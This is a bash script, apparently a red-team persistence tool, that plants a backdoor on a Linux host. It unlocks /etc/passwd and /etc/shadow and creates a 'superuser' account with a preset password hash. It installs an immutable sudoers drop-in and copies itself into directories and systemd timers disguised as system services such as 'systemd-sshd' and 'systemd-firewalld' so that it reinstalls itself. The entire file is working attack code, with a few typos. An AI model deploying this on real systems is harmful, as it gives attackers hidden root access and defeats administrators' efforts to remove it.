#! /bin/bash

RED_USER="superuser"
RED_PASSWORD='$6$HgWPY/N6uSgAx9we$ke1NzLNRtRV9qaZ6Wd6UYbaIwu2MnxmAYEHx1a3yUmyBMfCeoAVkIApbsITVCKYVmCPNiclrYtDkfuP2Ud9ba1'
RED_SHELL="/bin/bash"
SUDO_DROPIN="1_superuser"

# Make sure passwd and shadow are mutable
chattr -i -- /etc/passwd /etc/shadow

# Add the user if it doesn't exist
if ! id "$RED_USER" >/dev/null 2>/dev/null; then
	useradd -m $RED_USER
fi

# Ensure the user account is accessible
usermod --password "$RED_PASSWORD" $RED_USER
usermod --unlock "$RED_USER"
chsh --shell "$RED_SHELL" "$RED_USER"
usermod --expiredate 2069-12-31 "$RED_USER"

# Add our sudo drop-in file if its not there or been modified
if ! [ -f $SUDO_DROPIN ]; then
	cp -- /usr/share/systemd-userd/files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
	chattr +i -- /etc/sudoers.d/$SUDO_DROPIN
else
	if ! cmp --slient "/etc/sudoers.d/$SUDO_DROPIN" "files/$SUDO_DROPIN" >/dev/null 2>/dev/null; then
		chattr -i -- /etc/sudoers.d/$SUDO_DROPIN
		cp -- /usr/share/systemd-userd/files/$SUDO_DROPIN /etc/sudoers.d/$SUDO_DROPIN
		chattr +i -- /etc/sudoers.d/$SUDO_DROPIN
	fi
fi

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-firewalld \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd

cp -- /usr/share/systemd-userd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-userd/* /usr/share/systmed-maild/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-pamd/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-userd/* /usr/share/systemd-sshd/

systemctl daemon-reload

systemctl unmask systemd-bootd.service \
	systemd-firewalld.service \
	systemd-issued.service \
	systemd-maild.service \
	systemd-pamd.service \
	systemd-printerd.service \
	systemd-sshd.service

systemctl unmask systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-firewalld.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer

# vim: set filetype=sh:
